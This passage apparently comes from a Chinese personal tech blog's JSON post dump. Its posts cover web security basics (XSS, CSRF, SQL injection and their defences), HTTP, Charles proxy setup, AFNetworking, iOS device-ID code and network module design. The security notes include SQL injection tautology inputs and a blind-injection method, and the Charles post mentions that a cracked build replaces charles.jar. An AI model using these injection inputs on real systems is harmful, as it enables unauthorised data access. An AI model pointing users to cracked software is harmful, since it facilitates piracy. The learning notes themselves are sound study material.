但是由于WebServices效率实在不高,因为XML本身解析的复杂性,所以说逐渐有了替代技术,比如阿里的DUBBO,或者说RESTful(Representational State Transfer)架构,使用更加轻量级的REST请求来代替SOAP请求,但是它仍是属于WebServices整个框架的一部分,在目前主流的三种Web服务交互方案中REST相比于SOAP以及XML-RPC都更好.","tags":[{"name":"Web","slug":"Web","permalink":"http://yoursite.com/tags/Web/"},{"name":"Net","slug":"Net","permalink":"http://yoursite.com/tags/Net/"}]},{"title":"Web安全知识学习和总结","date":"2016-03-01T15:00:00.000Z","path":"2016/03/02/Web安全知识学习和总结/","text":"关联知识准备如果想学习Web安全首先要了解一定的前端基础,前端目前分为HTML+CSS+JS,各自的用途是 HTML: 网页的根本,用于设置网页哪里显示图片,哪里显示文字,哪里显示输入 CSS: 网页样式,就是类似皮肤,同样是文字,带不带加粗变色等等 JS: 网页脚本,一种脚本语言,用来操作网页上的节点和处理一些数据 HTTP基础: 网络通信的基本类型 相关知识可以通过教学网站进行科普,由于是标记和脚本语言,基本就是死记硬背来入门,学习基本规则. 置于HTTP,可以去看相关教科书,或者一些BLOG的通俗化讲解 第一本书一定要看完基础知识储备再来看书 入门第一本书被指导人推荐的是**白帽子讲Web安全**,阅读了主要是以下章节,以及重点 浏览器安全: 同源策略以及http机制和cookie是什么 跨站脚本攻击XSS: 反射性储存型以及XSS形成的根本思想!! 跨站请求伪造(CSRF): CSRF的实质!! 注入攻击: 注入的实质!!以及SQL注入概念和技巧!! 文件上传漏洞: 形成原理 认证和会话管理: 区分认证和授权的概念 访问控制: 注意水平权限越权问题 Web框架安全: 看完忘记了…▄︻┻┳═一…… ☆&lt;(=￣□￣=!)&gt; Web Server配置安全: 了解常见的Web Server以及注意区分和WebService不是一个东西 以上打了”!!”的三章,需要反复体会和进行实战,后续会有实战的总结 三个主要安全问题Web安全中主要的三个问题就是,但是虽然是Web安全,但是其思想可以用于任何网络通信交互的安全考量中 XSS(Cross Site Script): 跨站脚本注入 CSRF(Cross Site Request Forge): 跨站请求伪造 SQL注入(SQL injection): SQL语言注入 在进行了基础知识学习之后,先对其中具有共性的部分进行总结,然后分别对三个问题进行一些总结 总结XSS和CSRF的共同之处通过HTTP和HTML的基本概念我们可以知道两点: 所有HTTP中的网络通信都是通过Request进行的 HTML的所有节点中,”src=”标记,如图片和Frame中都是进行了一次Request得到的数据 所以说XSS和CSRF中的”XS”与”CS”所代表的Cross Site(跨站)问题就是通过这种方式在www.A.com的域下通过脚本执行到www.B.com的域下的过程. 而CSRF中的Request Forge(请求伪造)就更加直白了,就是利用了这种Request机制. 几个术语的解释开始看到安全的帖子或者讨论,最经常看到的是三个词语: 渗透/爆破/注入,这里说下自己的理解(可能是错的) [爆破]和[注入]是指的两种手段,而[渗透]是指使用不同的手段获取[数据]或[权限]的过程. 爆破的本质就是穷举,就是不停的尝试,直到尝试出正确的;而注入的本质是在正常的输入中插入恶意代码,利用文本解析的机制执行非正常逻辑的操作. 除去这些之外,还有爬虫等等术语,我也刚刚入门,懂得不多. 渗透的目的如果你是黑客,那么渗透的主要目的是数据,数据目前是可以卖钱的,如果你是白帽子,那么渗透的主要目的就是提权,看看能在渗透的过程中最高获得什么权限,从而检查安全措施是否到位. XSS总结XSS分为反射型和储存型,主要是通过注入的手段,在正常的网页文本中插入恶意代码,利用浏览器对HTML的文本解析机制,执行非正常逻辑的脚本. 首先来总结发生XSS的必备条件,再来区分反射型和储存型,必备条件包含: 网站需要有输入参数的地方 用户的输入会被通过某种方式再次呈现出来 条件1的所谓输入不一定是&lt;\\input&gt;标签的文本框类型,也可以是选择栏,或者submit,只需要通过工具进行intercept修改参数,能够控制传入值就可以了. 而条件2则是区分反射型和储存型的关键,许多书上都通过”反射型需要被害者进行一次交互,而储存型被害者只要点击了链接就会触发”来区分.其实真正区分的点在于你在条件1中的输入,网站会不会通过某种储存手段再次呈现时传递给他人来区分更好. XSS防护的手段通过HTML或者JS的[输入检查]和[输出编码],把常见的敏感字符进行输入时筛选,或者输出时进行转义,因为HTML页面分为读取和渲染两个过程,经过转义的字符,就不会在读取的过程中被执行,而渲染的过程中会把转义过的字符反转义,不影响用户理解. 反射型XSS和储存型XSS举例反射型有一个输入姓名的文本框,进行按键提交后会显示你的姓名在返回的页面内容里,一旦你离开这个网页,你所有输入都无法再找回,仅在你操作的过程中能看到你输入的姓名.如果此处存在XSS漏洞,这就是反射型的. 注意,这个和响应时间没关系,即使你进行了提交过了2小时才返回结果,也是反射型的,因为他需要两个条件: 需要用户操作 一旦过程中断,输入数据无法找回 储存型有一个输入姓名的文本框,进行提交后,你的姓名会发送到服务器储存在数据库里,返回的结果里会把所有数据库中的名字都返回到页面内容里.即使你离开这个页面,下次访问你输入的名字还在这个页面上,不仅你的二次访问可以看到,别人访问这个网站也可以看到.如果此处存在XSS漏洞,那就储存型的. 注意,这里可以是储存到数据库,也可以是其它储存手段,总之是网站的机制把你的输入作为整个HTML网页内容的一部分.常见的就是留言板,大家的留言都是保存在里面的.所以说储存型一般有这两个特点: 不需要用户操作,一旦解析了这个HTML页面,就会被触发 恶意代码不一定是你本机产生的,可能是别人产生的 CSRF总结跨站请求伪造的核心本质是窃取用户的Session,或者说Cookie,因为目前主流情况Session都是存在Cookie中.攻击者并不关心被害者具体帐号和密码,因为一旦用户进行了登录,Session就是用户的唯一凭证,只要攻击者能够得到Session,就可以伪装成被害者进入服务器. 利用HTML的Request机制,攻击者发送给被害者一个www.B.com域名下的网站,内部嵌入了恶意的&quot;src=www.A.com&quot;的Request指令,如果被害者打开B.com时当前浏览器正好已经登录过了A.com并且把A.com的Cookie放入了浏览器,那么在B.com下Request站点A.com时就会带走A.com的Session.服务器会错误的认为B.com的恶意请求是用户自己发出的. 这种在B.com下访问隐匿的访问A.com就是CS跨站的意思,而”src=”的这种请求方式带走了A.com的Session,就是RF请求伪造. CSRF的防护我们可以发现CSRF之所以能成功是因为B.com取走了A.com的Session,所以说大多数浏览器采用了HttpOnly标记,防止Cookie被另外一个域通过JS脚本取走.但是在B.com中伪造请求,攻击者并不直接拿到Session,只是先诱导受害者登录A.com让Session存在于浏览器中. CSRF一般的主要目的是攻击网站的管理员,并且用管理员新建一个管理员用户作为后门,从而进行更多的操作.而上述这种CSRF冒充行为,防护的手段是CSRF+Token的方式,每次请求都增加一个为Token字段进行验证是否是用户本人的操作,还是Request Forge. SQL注入总结注入攻击是指以注入作为手段的攻击方法,其中最出名和常见的就是SQL注入,其实除去SQL注入,任何基于文本解析的机制都可以进行注入攻击,如 命令行注入 XML注入 CRLF换行符注入(Carriage Return Line Feed Injection) 其发生的本质,是基于文本解析的机制无法分辨代码是否是恶意代码,仅仅是顺序读取和执行,因为通常文本解析的语言并不会进行编译. SQL注入的基本手段锁定SQL语句值通过or始终为True,或者通过and始终为False number OR 1=1 number AND 1=2 string&#39; OR &#39;1&#39;=&#39;1 string&#39; AND &#39;1&#39;=&#39;2 SQL盲注首先猜测某个SQL语句,然后通过执行的反馈结果判断猜测是否准确,假设输入某个value值,系统给出正确返回结果,此时进行写出自己的SQL猜测语句judge value AND judge 进行输入,如果返回结果与value相同,说明judge的猜测正确,如果错误说明judge的猜测错误 SQL注入的防护既然可以看到注入类攻击的核心原因是因为很多语言的顺序执行机制,和文本解析的本质,那么我只需要打破这种机制就可以防止注入攻击的发生. 以SQL注入为例,可以通过JAVA中的绑定变量等方法进行预防,JAVA的绑定变量方法是吧用户的输入作为一种变量,对SQL语句进行预编译,这样在执行时就不是顺序执行,而是把输入作为一种变量进行处理,不会在运行时进行动态的拼接SQL语句,防止了恶意的攻击代码被写入SQL语句进行解析和执行.","tags":[{"name":"Web","slug":"Web","permalink":"http://yoursite.com/tags/Web/"},{"name":"Security","slug":"Security","permalink":"http://yoursite.com/tags/Security/"}]},{"title":"HTTP报文基本概念学习","date":"2016-02-29T15:00:00.000Z","path":"2016/03/01/HTTP报文基本概念学习/","text":"HTTP是什么HTTP是HyperText Transfer Protocol的缩写,中文就是超文本传输协议,所谓的超,是个学术用语,是基于某种事物增加了更多的信息维度,比如超像素xxx之类的. 协议是什么,协议说白了就是约定,约定就是模板,就是表格,就和你去银行办手续一样,客户不知道要提供什么信息,银行又不能一个客户一个客户教,所以就准备一样表格. HTTP的脑洞(无事实根据)为什么会有HTTP叫做报文呢,因为我觉得以前最早大家都是通过电报机来远程快速传递信息.由于每个字都老贵了,所以能简短就简短.就有了报文这个东西,一般包含以下信息 发件人 收件人 干什么 所以说到了现在都超文本这么吊的东西了,说白了还是和电报一样,滴滴滴,你发给服务器一个电报,服务器看看,然后滴滴滴,回给你一个电报.这就是所谓的超文本传输协议. 但是吊就吊在这个超字上,现在电脑便宜了,大街上一百块一台,所以说可以发更多的信息了,所谓更多的信息,就是除了文本本身的内容外,还可以携带一些网络参数以及约定的信息等,是指的信息维度的增加(除去内容还有其它维度),而不是文本内容变长了. 所以说HTTP通信,本质上和以前的电报还是没有什么区别的,唉,人类真是聪明又愚蠢啊. HTTP报文格式就像刚刚说的,一张白纸,怎么写才能让两边指导什么写的是什么呢?就牵扯到格式了,这种格式约定就是协议.HTTP其实就是一张这样的表单 HTTP报文头就如同刚刚脑洞中以电报举例一样,HTTP的报头主要是一些参数信息,类似于 发件人 收件人 并不包含实际文本内容 HTTP报文头首行有3个数据,来分辨这个是Request报文还是Response报文,接下来每行是一个字段和一个内容,这些字段都是W3C规定好的,你当然可以自定义,但是只不过通用标准不认罢了.所以说字段相当于表格中 姓名: some SB 里的姓名,”some SB”这个内容可能会变,但是不管怎么发报文,姓名这一栏不会变. HTTP报文体HTTP报文体是开始于HTTP报文头遇到一个仅有换行的空行开始,这也是为什么会有CRLF换行符注入这种攻击,因为报文都是通过换行符来判断哪里是内容开始,报文头结束.可以通过换行符的注入,当报文头提前结束,进入报文体. HTTP的Request和Response就像刚刚说的一样,虽然HTTP都是基于报文,但是你发给服务器的电报和服务器返回给你的电报是不同的,他们的主要区别在于两点 报文头的字段 报文体是否可以省略 在Request中报文体并不是必须的,有些Request方法中可以省略,而Response中是不可以省略的,如果报文体因为各种情况没有了,那么就是空返回. HTTP报文头的字段通用字段 Connection Content-Encoding Content-Length Content-Type Transfer-Encoding 请求Request字段 Accept Accept-Encoding Authorization Cookie Host If-Modified-Since If-None-Match Origin Referer User-Agent 响应Response字段 Access-Control-Allow-Origin Cache-Control ETag Expires Location Pragma Server Set-Cookie WWW-Authenticate X-Frame-Options HTTP的Request方法HTTP一共有六种Request方法,其中最重要的是GET和POST方法,除了这两个外还有剩下四种,但是不太常用. HEAD TRACE OPTIONS PUT 虽然不太常用,并不是不用注意 比如有根据TRACE的机制进行攻击的方法.TRACE方法主要用于诊断,服务器会返回Request里所有的报文头诶报文内容信息,所以在某下情况下,如果本地无法获取到Request的报文头,可以通过伪造链接,使用TRACE方法从返回报文里都出来Request中的信息.","tags":[{"name":"Net","slug":"Net","permalink":"http://yoursite.com/tags/Net/"},{"name":"HTTP","slug":"HTTP","permalink":"http://yoursite.com/tags/HTTP/"}]},{"title":"Charles抓包Localhost","date":"2016-02-20T15:00:00.000Z","path":"2016/02/21/Charles抓包Localhost/","text":"抓包工具CharlesMac上的抓包工具Charles可以用于分析网络包,破解版需要将一个文件进行替换 /Applications/Charles.app/Contents/Java/charles.jar 然后输入名字和License Charles和Shadowsocks的冲突Charles实际是修改了”系统偏爱设置-网络-高级-代理”里的Web代理和Web安全代理,指向了本地的Charles的端口,从而监听网络流量 而常用的翻墙软件Shadowsocks也是同样的作用,所以如果打开Shadowsocks会更改掉这里的配置,导致Charles抓不到包 可以手动配置,或者直接关掉Shadowsocks Charles无法监听本地服务器在使用MAMP等建立的本地服务时,访问使用 http://localhost:8080/ http://127.0.0.0:8080/ 访问的网页无法被抓到,此时可以通过访问Mac的本地另外一个域名访问,从StackOverflow找到的,terminalname就是在终端中的用户名 http://terminalname.local:8080/WebGoat/login.mvc 而另一个Charles提供的本地域名,也抓不到 http://localhost.charlesproxy.com:8080/WebGoat/login.mvc","tags":[{"name":"Security","slug":"Security","permalink":"http://yoursite.com/tags/Security/"},{"name":"Net","slug":"Net","permalink":"http://yoursite.com/tags/Net/"}]},{"title":"AFNetworking2.0和3.0的区别","date":"2016-02-18T15:00:00.000Z","path":"2016/02/19/AFNetworking2.0和3.0的区别/","text":"AFNetworkingAFNetworking是Alamofire组织提供的iOS第三方网络库,Alamo/ˈæləˌmo/ 这个单词是白杨和阿拉莫组织的意思,Alamo是个传教组织,这个名字起得逼格满满,有OC版本和Swift版本 最开始我接触的是AFNetworking 2.6版本,在使用中更新了AFNetworking 3.0版本,两个版本在基本实现方法上有一定区别.在写文章网络模块的思考的时候,进行了一点学习由于AFNetworking 3.0没有实战,可能理解有偏差 AFNetworking 2.0和3.0的区别苹果源生提供的网络模块分为两个类,一个是03年的NSURLConnection,另一个是13的的NSURLSession. AFNetworking 2.X其根本实现是调用了iOS的NSURLConnection AFNetworking 3.0其根本实现是调用了iOS的NSURLSession 由于NSURLConnection和NSURLSession的基本思想不同,所以AFNetworking所处的位置也不同 NSURLConnection是以HTTP基本方法为核心,分为GET POST等 NSURLSession是以TASK为核心分为Data,Upload,Download AFNetworking 2.0AFNetworking 2.0的核心是一个AFHTTPRequestOperationManager的单例类,使用者只需要创建了单例类,给出了URL,就可以完成网络请求,单例内部完成了以下工作: AFNetworking内部自动构造NSURLRequest 使用基于NSOperation的类AFURLConnectionOperation自动管理请求队列 AFURLConnectionOperation中使用NSURLConnection发起网络请求 AFNetworking 3.0由于3.0改为了NSURLSession,其核心变为了AFURLSessionManager的类,这个类包含了返回值为不同Task的类方法,完成网络请求的流程变为以下 用户自己初始化NSURLSessionConfiguration 通过NSURLSessionConfiguration初始化AFNetworking的AFURLSessionManager 用户自己构造NSURLRequest 用户通过AFURLSessionManager的类方法初始化NSURLSessionTask完成网络请求 AFNetworking 2.0和3.0的职能通过以上比较可以发现: AFNetworking 2.0是封装了NSURLRequest和NSURLConnection,用户不用关心苹果源生代码 AFNetworking 3.0则是变成苹果源生代码中,用来初始化Task的一个工具 最大的不同是3.0用户需要自己初始化NSURLRequest和NSURLSessionConfiguration","tags":[{"name":"iOS","slug":"iOS","permalink":"http://yoursite.com/tags/iOS/"},{"name":"AFNetworking","slug":"AFNetworking","permalink":"http://yoursite.com/tags/AFNetworking/"}]},{"title":"iOS设备唯一标识符的讨论","date":"2016-02-18T15:00:00.000Z","path":"2016/02/19/iOS设备唯一标识符的讨论/","text":"UUID/UDID/IDFA/IDFV是啥UDID (Unique Device Identifier)从名字看就是唯一设备标识符但是这个玩意在iOS5中被苹果禁掉了,所以基本不讨论了. 顺带一提,iOS6中禁掉了MAC地址的获取,所以也基本不讨论了. UUID（Universally Unique Identifier)通用唯一识别码，可以通过IDFA和IDFV进行生成,每次一旦重新生成就会改变.所以现在大多把其生成结果保存在钥匙串KeyChain里,因为KeyChain是伴随着设备或者iCloud的. IDFA (Identifier For Advertising)广告标识符,Apple公司用于追踪广告,可以用于生成UUID 缺点：用户可通过”设置-隐私-广告-还原广告标识符”还原，之后会得新的到标识符 系统要求: iOS&gt;=6.0 获取方法 #import &lt;AdSupport/AdSupport.h&gt; NSString *idfa= [[[ASIdentifierManager sharedManager] advertisingIdentifier] UUIDString]; IDFV (Identifier For Vendor)开发商标识符,Vendor是小贩的意思,Apple 的意思是你们开发者都是小贩,我是城管,具体Vendor是指CFBundleIdentifier的前两部分,例如 com.baidu.tieba 和 com.baidu.image 得到的IDFV是相同的,因为它们的CFBundleIdentifier 前两部分是相同的. 缺点：把同一个开发商的所有应用全卸载后，再次安装取到的IDFV会不同。注意是所有应用,比如百度贴吧和百度云 要求：iOS&gt;=6.0 获取方法 NSString *idfv = [[[UIDevice currentDevice] identifierForVendor] UUIDString]; 唯一标识符策略目前通用的唯一标识符策略是在某种UUID生成后(通过IDFV/IDFA生成),保存至KeyChain和自定义剪切版 KeyChain目的: 即使标识符被还原了,设备不清空KeyChain读取,就可以从KeyChain读取. 剪贴板目的: 有时写入KeyChain会因为各种原因失败,作为一种保险措施 但是即使这样,也不能保证设备标识永久不变,存在以下情况 用户并没有登录iCloud或者iCloud并没有开启钥匙串同步 用户进行了刷机或者通过卸载应用重置广告位等清空了一次UUID 以上两种情况同时出现,那么同一台设备就会被标识成一台新设备 唯一标识符代码@interface DeviceIDTool : NSObject //设备指纹ID + (NSString *)deviceUUID; @end #import &quot;DeviceIDTool.h&quot; #import &quot;KeychainItemWrapper.h&quot; #import &lt;CommonCrypto/CommonDigest.h&gt; NSString *const kDeviceUUID = @&quot;com.baidu.tieba.uuid&quot;;//UUID在KeyChain的Key值 NSUInteger const md5CodeLength = 5;//摘要位数 NSUInteger const firstLength = 8;//片段一加密长度 NSUInteger const secondLength = 10;//片段二加密长度 @implementation DeviceIDTool //取出UUID + (NSString *)deviceUUID &#123; NSString *deviceId = [self deviceID] ; if(deviceId.length-md5CodeLength&gt;0) &#123; return [deviceId substringToIndex:deviceId.length-md5CodeLength] ; &#125; return deviceId ; &#125; //生成UUID + (NSString *)deviceID &#123; NSString *deviceID = nil ; //生成KeyChain,取出ID的数据 KeychainItemWrapper *keychainItem = [[KeychainItemWrapper alloc] initWithIdentifier:kDeviceUUID accessGroup:nil] ; NSString *deviceID1 = [keychainItem objectForKey:(id)kSecValueData] ; //生成剪切版,取出剪贴板数据 NSString *deviceID2 = nil ; UIPasteboard *pasteboard = [UIPasteboard pasteboardWithName:kDeviceUUID create:YES] ; NSData *data = [pasteboard valueForPasteboardType:kDeviceUUID] ; if(data &amp;&amp; [data isKindOfClass:[NSData class]]) &#123; deviceID2 = [[NSString alloc] initWithData:data encoding:NSUTF8StringEncoding]; &#125; //去过取出为空,则进行生成,并放入剪贴板和KeyChain,函数返回 if (deviceID1.length==0 &amp;&amp; deviceID2.length==0) &#123; deviceID = [self generatorDeviceId] ; [keychainItem setObject:kDeviceUUID forKey:(id)kSecAttrAccount]; [keychainItem setObject:deviceID forKey:(id)kSecValueData]; [pasteboard setValue:deviceID forPasteboardType:kDeviceUUID] ; return deviceID ; &#125; //成功取出,检查UUID是否符合自定义摘要逻辑 BOOL deviceIdAvailable1 = [self checkDeviceIdAvailable:deviceID1] ; BOOL deviceIdAvailable2 = [self checkDeviceIdAvailable:deviceID2] ; //生成Current UUID NSString *uniqueIdentifier = [[[UIDevice currentDevice] identifierForVendor] UUIDString]; //检查从KeyChain取出的UUID是否包含Current UUID if([deviceID1 hasPrefix:uniqueIdentifier]) &#123; [pasteboard setValue:deviceID1 forPasteboardType:kDeviceUUID] ; return deviceID1 ; &#125; //检查从粘贴板取出的UUID是否包含Current UUID if([deviceID2 hasPrefix:uniqueIdentifier]) &#123; [keychainItem setObject:kDeviceUUID forKey:(id)kSecAttrAccount]; [keychainItem setObject:deviceID2 forKey:(id)kSecValueData]; return deviceID2 ; &#125; //KeyChain和剪贴板都符合自定义逻辑 if(deviceIdAvailable1 &amp;&amp; deviceIdAvailable2) &#123; //KeyChain和剪贴板相同,返回KeyChain if ([deviceID1 isEqualToString:deviceID2]) &#123; return deviceID1 ; &#125; else &#123; //KeyChain和剪贴板不同,但是却同时都符合逻辑 [keychainItem setObject:kDeviceUUID forKey:(id)kSecAttrAccount]; [keychainItem setObject:deviceID2 forKey:(id)kSecValueData]; return deviceID2 ; &#125; &#125; //KeyChain符合逻辑，粘贴板不符合逻辑,返回KeyChain并重写剪贴板 else if (deviceIdAvailable1 &amp;&amp; !deviceIdAvailable2) &#123; [pasteboard setValue:deviceID1 forPasteboardType:kDeviceUUID] ; return deviceID1 ; &#125; //KeyChain不符合逻辑,剪贴板符合逻辑,返回剪贴板,重写KeyChain else if (!deviceIdAvailable1 &amp;&amp; deviceIdAvailable2) &#123; [keychainItem setObject:kDeviceUUID forKey:(id)kSecAttrAccount]; [keychainItem setObject:deviceID2 forKey:(id)kSecValueData]; return deviceID2 ; &#125; else &#123; //都不符合逻辑,于是重新生成新的 deviceID = [self generatorDeviceId] ; [keychainItem setObject:kDeviceUUID forKey:(id)kSecAttrAccount]; [keychainItem setObject:deviceID forKey:(id)kSecValueData]; [pasteboard setValue:deviceID forPasteboardType:kDeviceUUID] ; return deviceID ; &#125; return nil ; &#125; //通过IDFV取出UUID + (NSString *)generatorDeviceId &#123; NSString *uniqueIdentifier = [[[UIDevice currentDevice] identifierForVendor] UUIDString]; return [self encryptUUID:uniqueIdentifier] ; &#125; //自定义摘要逻辑,取两个片段进行md5,然后合并md5结果再来一次 //取UUID然后拼接md5CodeLength长度的摘要 + (NSString *)encryptUUID:(NSString *)uuid &#123; if(uuid.length&gt;20) &#123; NSString *subString1 = [uuid substringToIndex:firstLength] ; NSString *subString2 = [uuid substringToIndex:secondLength] ; subString1 = [self md5Encrypt:subString1] ; subString2 = [self md5Encrypt:subString2] ; //合并之后再来一次 NSString *combineString = [subString1 stringByAppendingString:subString2]; NSString *md5 = [self md5Encrypt:combineString] ; if(md5.length &gt;= md5CodeLength) &#123; md5 = [md5 substringToIndex:md5CodeLength-1] ;//取前md5CodeLength位 return [uuid stringByAppendingFormat:@&quot;-%@&quot;, md5] ;//加入原文UUID后 &#125; &#125; return uuid ; &#125; //验证合法性 + (BOOL)checkDeviceIdAvailable:(NSString *)deviceId &#123; if(deviceId.length&gt;md5CodeLength) &#123; //取出UUID中系统生成的部分,进行自定义逻辑计算 NSString *uuid = [deviceId substringToIndex:deviceId.length-md5CodeLength] ; NSString *encrypt = [self encryptUUID:uuid] ; //检查经过自定义摘要逻辑后是否还是原字符串 //符合即为合法的,且符合自定义逻辑 if ([encrypt isEqualToString:deviceId] &amp;&amp; ![encrypt isEqualToString:uuid]) &#123; return YES ; &#125; &#125; return NO ; &#125; + (NSString *)md5Encrypt:(NSString *)string &#123; const char *original_str = [string UTF8String]; unsigned char result[CC_MD5_DIGEST_LENGTH]; CC_MD5(original_str, (unsigned int)strlen(original_str), result); NSMutableString *hash = [NSMutableString string]; for (int i = 0; i &lt; CC_MD5_DIGEST_LENGTH; i++) &#123; [hash appendFormat:@&quot;%02X&quot;, result[i]]; &#125; return hash; &#125; @end 唯一标识符被冒用的可能性假设正常用户A下载APP生成了UUID1 = UUIDA+MD5A,根据逻辑存入了A的iCloud-KeyChain.存入时使用了开发者自定义的Key(kDeviceUUID),和根据自定义逻辑(encryptUUID)生成的Value.开发者B的AppB使用这个UUID1来认证正常用户A 此时冒用者C在自己设备上想冒充正常用户A,由于C无法接触到A的设备,在AppB中的 + (NSString *)deviceID &#123; ... NSString *uniqueIdentifier = [[[UIDevice currentDevice] identifierForVendor] UUIDString]; ... &#125; 由于重新生成了UUID,不可能和正常用户A的UUID1一样,所以此时为UUID2. 冒用者此时需要把自己KeyChain中的Key = kDeviceUUID 对应的Value值改为UUID1,且名称为kDeviceUUID粘贴板中的值也改为UUID1才能冒充成正常用户A 所以说冒用者C必须知道正常用户的iCloud帐号且知道对应的Key = kDeviceUUID 才能定位到UUID1 如果正常用户A没有同步KeyChain,那么必须接触到用户的设备,才有可能知晓UUID1. 结论极端情况下UUID是可以被冒充的,但是必须同时掌握 App账户 iCloud账户 App存储所用Key值 才能触及用户信息,基本能同时掌握这三个的也只有用户本人了.","tags":[{"name":"iOS","slug":"iOS","permalink":"http://yoursite.com/tags/iOS/"},{"name":"Net","slug":"Net","permalink":"http://yoursite.com/tags/Net/"},{"name":"Device","slug":"Device","permalink":"http://yoursite.com/tags/Device/"}]},{"title":"APP路由的设想","date":"2016-02-17T15:00:00.000Z","path":"2016/02/18/APP路由的设想/","text":"APP路由的起因公司的APP在处理产品需求的时候,经常突然要从界面A进入界面B,但是以往的逻辑中.AB界面并不在一个流程内. 根据自己最近使用的另一个设计局部单例模块,让APP中不同的功能完全可以和主工程做到热插拔,随时独立出来成为一个单独的App,有自己的界面和功能. 也就是说主APP和APP中的某个功能模块,就像是套环的USB插头一样,之间只有数据传输,不管是组合在一起还是自己独立都可以作为一个APP “奥F☌A义”的出现此时可以把,主APP当作一个”伪”服务器,而APP里的功能模块,当作不同的”伪”客户端,只要我服务器通过一种自定义的协议,把数据穿送给客户端,客户端(功能)就会启动,开始工作. 可是怎么启动功能呢,每个功能模块的名字都不一样,而且自启动不容易实现,需要有个像开车一样”打火”的钥匙,这个钥匙或者称为中间件,就是APP路由 APP路由里可能会用到的知识点APP路由目前只是个设想,进行了一部分验证,以下是会用到的知识点. 为了实现方法名和类名的动态KVC绑定,反射(Reflect)的相关函数NSClassFromString 为了保存一些静态数据,回用到XML或者Plist 需要一个类来编解APP路由的自定义协议 静态数据通常包含主APP无法提供,功能模块初始化又需要的一些固定数据 需要对功能中流程里的每个界面进行数字或者id编号,存入静态数据,方便从任意流程启动到任意界面 APP路由使用设想 “真”服务器端传来字符串,或者H5界面传来字符串,进入主APP,主APP生成自定义协议带着要启动的功能模块名,主APP提供的数据,经过静态数据储存取出启动模块的所有必备条件,启动某个模块,数据的传递过程可以参考网络请求GET串,或者封装成JSON.","tags":[{"name":"iOS","slug":"iOS","permalink":"http://yoursite.com/tags/iOS/"},{"name":"Memory","slug":"Memory","permalink":"http://yoursite.com/tags/Memory/"},{"name":"JavaScript","slug":"JavaScript","permalink":"http://yoursite.com/tags/JavaScript/"},{"name":"Architecture","slug":"Architecture","permalink":"http://yoursite.com/tags/Architecture/"}]},{"title":"网络请求模块的思考:Block模式","date":"2016-02-14T15:00:00.000Z","path":"2016/02/15/网络请求模块的思考Block/","text":"单次网络请求的实现网络请求的实现一般分为两种方法 通过iOS源生类NSURLConnection或者NSURLSession 使用第三方库AFNetworking或者MKNetworkKit等 NSURLConnection与NSURLSession根据Objective-C.io介绍和官方文档介绍,2013年NSURLSession正式推出,是NSURLConnection的重构版,但是其核心都是实例化一个NSURLRequest传递给NSURLConnection或者NSURLSession。然后异步地返回一个NSURLResponse以及包含服务器返回信息的NSData。 NSURLConnection这个名字,实际上是指一系列有关联的组件： NSURLRequest NSURLResponse NSURLProtocol NSURLCache NSHTTPCookieStorage NSURLCredentialStorage 同名类NSURLConnection。 NSURLSession指的也不仅是同名类 NSURLSession， NSURLRequest NSURLCache NSURLSession 基类NSURLSessionTask 上传下载用的NSURLSessionConfiguration 子类NSURLSessionDataTask: NSURLSessionTask 子类NSURLSessionUploadTask: NSURLSessionTask 子类NSURLSessionDownloadTask: NSURLSessionTask NSURLSessionStreamTask 官方文档是这样解释的 NSURLSession—A session object. NSURLSessionConfiguration—A configuration object used when initializing the session. NSURLSessionTask—The base class for tasks within a session. NSURLSessionDataTask—A task for retrieving the contents of a URL as an NSData object NSURLSessionUploadTask—A task for uploading a file, then retrieving the contents of a URL as an NSData object NSURLSessionDownloadTask—A task for retrieving the contents of a URL as a temporary file on disk NSURLSessionStreamTask—A task for establishing a TCP/IP connection AFNetworking与MKNetworkKit第三方库使用起来就更加方便,以AFNetworking2.0举例 - (AFHTTPRequestOperation *)POST:(NSString *)URLString parameters:(id)parameters success:(void (^)(AFHTTPRequestOperation *operation, id responseObject))success failure:(void (^)(AFHTTPRequestOperation *operation, NSError *error))failure 可以看到一个POST请求被封装成一个接口,然后成功的数据被解析成一个responseObject返回,错误被封装成NSError,所有请求的状态都被封装入AFHTTPRequestOperation.可见,第三放库连NSURLRequest也不用创建,爽的飞起 网络模块的目的由于在一个App中需要发出的请求不止一条,所以需要一个模块统一管理所有请求,便于维护和更新.因为不可能在每一个需要网络请求的地方,都需要写URL的字符串,然后再调用网络请求实现方法来请求,这样想也知道代码会混乱和一坨屎一样. 网络模块的分层设计网络模块的设计最主要的一个概念分层,以目前我在使用的设计来讲,一般分为两层 Service层 (服务层) API层 (数据层) RequestCore层 (网络请求核心层) 不同层有不同的职能,以Service层来说: 直接对外提供网络服务,用户只需要传入参数,就可以获得固定接口的返回值 对用户传入的数据以及对全局数据进行路由 对数据进行字符串化加解密等简单处理 执行API层函数 API层的职能: 接收从服务层传来的纯字符串数据 确定请求的地址URL,并且把参数进行组装序列化 执行RequestCore层核心请求代码 RequestCore层的职能: 接收从API层传来的URL地址,参数等 执行网络请求,通过NSURLSession或者AFNetworking等不同方法实现 网络模块的接口设计网络模块的接口设计,为了方便管理和规划,主要用到了以下规则 使用头文件和宏(或静态字符串)来管理接口地址(URL) Service层和API层全部使用类函数(+) 避免存在属性(Property),Service层和API层并不进行实例化 使用Category分类来管理不同层的接口函数(API+Category与Service+Category) Service层和API层对外通信使用Model,各自有对应的Handler函数进行Model的处理 使用全局单例来管理RequestCore 网络模块的通信设计在对网络模块进行分层规划,以及对每一层的接口样式进行设计之后,层与层直接需要进行通信,也就是数据传输,因为网络请求可能会存在并发和异步,所以说使用什么通讯方法十分关键.目前我接触到的有两种 使用闭包(Block) 使用通知(Notification) 如果使用闭包,每一个接口函数包含一个闭包,这个闭包是可复用的,所以便于处理和管理.如果使用通知,也需要将每个接口对应的对应的ID,通过KVC的方法动态绑定到一个Notification的userInfor中,使用同一个NotificationID来复用 本人目前使用的网络模块是用闭包Block进行通讯,而一位同事的GitHub中,有使用通知的示例 从底至顶实现一个网络模块URL接口头文件APIConfigureHeader.h#ifndef APIConfigureHeader_h #define APIConfigureHeader_h #define APIFormat(Head, Version, Function) ([NSString stringWithFormat:@&quot;/%@/%@/%@&quot;, Head, Version, Function]) #define API_Version @&quot;V1&quot; #pragma mark - Environment Configure //0.生产环境 //1.准生产环境 #define __Environment_Mark__ (0) #if (__Environment_Mark__ == (0)) //生产环境 #define API_BaseUrl @&quot;https://client.baidu.com.cn&quot; //基础域名 #define API_Login_Head @&quot;account/api/login&quot;//账户模块登录 #elif (__Environment_Mark__ == (1)) //准生产环境 #define API_BaseUrl @&quot;http://client.test.baidu.com.cn&quot; //基础域名 #define API_Login_Head @&quot;app/account/api/login&quot;//账户模块登录 #endif #pragma mark - API Address Configure #define 